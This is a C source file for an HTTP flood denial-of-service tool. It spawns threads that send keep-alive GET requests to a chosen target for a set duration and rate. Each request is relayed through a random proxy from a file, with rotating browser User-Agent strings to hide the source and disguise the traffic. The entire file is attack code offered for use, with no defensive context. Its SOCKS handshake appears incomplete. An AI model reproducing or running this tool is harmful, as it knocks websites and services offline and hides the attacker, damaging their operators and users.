#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define UA_POOL_SIZE 8
#define REQUEST_TEMPLATE "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n"

const char *user_agents[UA_POOL_SIZE] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64)...",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1)...",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0)...",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)..."
};

typedef struct {
    char target[256];
    int port;
    int duration;
    int rate;
    char **proxies;
    int proxy_count;
} attack_config_t;

void *flood_thread(void *arg) {
    attack_config_t *cfg = (attack_config_t *)arg;
    time_t end = time(NULL) + cfg->duration;
    char request[1024];

    while (time(NULL) < end) {
        for (int r = 0; r < cfg->rate; r++) {
            const char *ua = user_agents[rand() % UA_POOL_SIZE];
            snprintf(request, sizeof(request), REQUEST_TEMPLATE, cfg->target, ua);

            char *proxy = cfg->proxies[rand() % cfg->proxy_count];
            char ip[64]; int pport;
            sscanf(proxy, "%[^:]:%d", ip, &pport);

            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct sockaddr_in serv;
            serv.sin_family = AF_INET;
            serv.sin_port = htons(pport);
            serv.sin_addr.s_addr = inet_addr(ip);

            if (connect(sock, (struct sockaddr *)&serv, sizeof(serv)) == 0) {
                unsigned char req[9] = { 4, 1, cfg->port >> 8, cfg->port & 0xFF, 0, 0, 0, 1, 0 };
                send(sock, req, sizeof(req), 0);
                recv(sock, req, 8, 0); // ignore response

                send(sock, request, strlen(request), 0);
            }
            close(sock);
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Use: %s <target> <port> <time> <rate> <threads> <proxy.txt>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    attack_config_t cfg;
    strncpy(cfg.target, argv[1], sizeof(cfg.target) - 1);
    cfg.port = atoi(argv[2]);
    cfg.duration = atoi(argv[3]);
    cfg.rate = atoi(argv[4]);
    int threads = atoi(argv[5]);

    FILE *fp = fopen(argv[6], "r");
    if (!fp) {
        perror("Proxy file");
        return 1;
    }

    cfg.proxy_count = 0;
    cfg.proxies = malloc(10000 * sizeof(char *));
    char line[128];
    while (fgets(line, sizeof(line), fp) && cfg.proxy_count < 10000) {
        line[strcspn(line, "\r\n")] = 0;
        cfg.proxies[cfg.proxy_count++] = strdup(line);
    }
    fclose(fp);

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++)
        pthread_create(&tid[i], NULL, flood_thread, &cfg);

    for (int i = 0; i < threads; i++)
        pthread_join(tid[i], NULL);

    for (int i = 0; i < cfg.proxy_count; i++)
        free(cfg.proxies[i]);
    free(cfg.proxies);

    return 0;
}